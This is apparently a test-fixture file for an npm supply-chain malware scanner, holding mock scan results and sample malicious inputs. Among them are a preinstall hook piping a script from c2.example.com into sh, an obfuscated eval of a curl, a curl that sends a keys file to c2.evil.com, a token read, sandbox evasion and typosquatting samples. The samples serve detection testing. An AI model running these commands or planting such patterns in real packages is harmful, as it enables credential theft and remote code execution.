export const MOCK_SCANS = [
  {
    package_name: 'lodash',
    version: '4.17.21',
    findings: [
      { id: 'ATK-003', atk_id: 'ATK-003', severity: 'high', title: 'Credential harvest', description: 'Scrapes env vars', evidence: 'process.env.NPM_TOKEN' },
      { id: 'ATK-009', severity: 'medium', title: 'Time trigger', description: 'Conditional trigger (time-based)', evidence: 'time-based trigger detected' },
    ],
  },
];

export const SINGLE_SCAN = MOCK_SCANS[0];

export const EMPTY_SCAN = { package_name: 'clean-pkg', version: '1.0.0', findings: [] };

export const MULTI_SEV_SCAN = {
  package_name: 'multi-sev', version: '1.0.0', findings: [
    { id: 'ATK-001', severity: 'critical', title: 'Critical finding' },
    { id: 'ATK-002', severity: 'high', title: 'High finding' },
    { id: 'ATK-003', severity: 'medium', title: 'Medium finding' },
    { id: 'ATK-004', severity: 'low', title: 'Low finding' },
  ],
};

export const ALL_ATK_SCAN = {
  package_name: 'all-atk', version: '1.0.0', findings:
    Array.from({ length: 11 }, (_, i) => ({
      id: `ATK-${String(i + 1).padStart(3, '0')}`,
      atk_id: `ATK-${String(i + 1).padStart(3, '0')}`,
      severity: 'medium',
      title: `ATK-${i + 1}`,
    })),
};

export const CLEAN_PACKAGE = {
  name: 'test-pkg',
  version: '1.0.0',
  scripts: { test: 'node test.js' },
  dependencies: { express: '4.0.0' },
};

export const CLEAN_CODE = 'module.exports = function() { return 42 }';

export const PREINSTALL_MALICIOUS = {
  scripts: { preinstall: 'curl http://c2.example.com/x.sh | sh' },
};

export const EVAL_OBFUSCATED = [{ path: 'i.js', content: 'eval(atob("Y3VybCBodHRwOi8vYzIuZXZpbC5jb20="))' }];

export const CRED_EXFIL = [{ path: 'i.js', content: 'console.log(process.env.NPM_TOKEN)' }];

export const PERSIST_CODE = [{ path: 'i.js', content: 'fs.mkdirSync(".vscode")' }];

export const NET_EXFIL_CODE = [{ path: 'i.js', content: 'curl --data-binary @keys http://c2.evil.com' }];

export const DEP_CONF_PACKAGE = { dependencies: { 'acorn-squatter': '1.0.0' } };

export const TYPOSQUAT_PACKAGE = { dependencies: { lodash: 'latest', loddsh: '1.0.0' } };

export const TAMPER_PACKAGE = {
  name: 'lodash',
  repository: { url: 'https://github.com/attacker/lodash-evil.git' },
};

export const CI_TRIGGER_CODE = [{ path: 'i.js', content: 'if (process.env.CI) { eval(atob("ZXZpbA==")) }' }];

export const SANDBOX_CODE = [{ path: 'i.js', content: 'if (os.hostname().includes("sandbox")) { process.exit(0) }' }];

export const PROPAGATION_CODE = [{ path: 'i.js', content: 'exec("npm install ./malicious-pkg")' }];
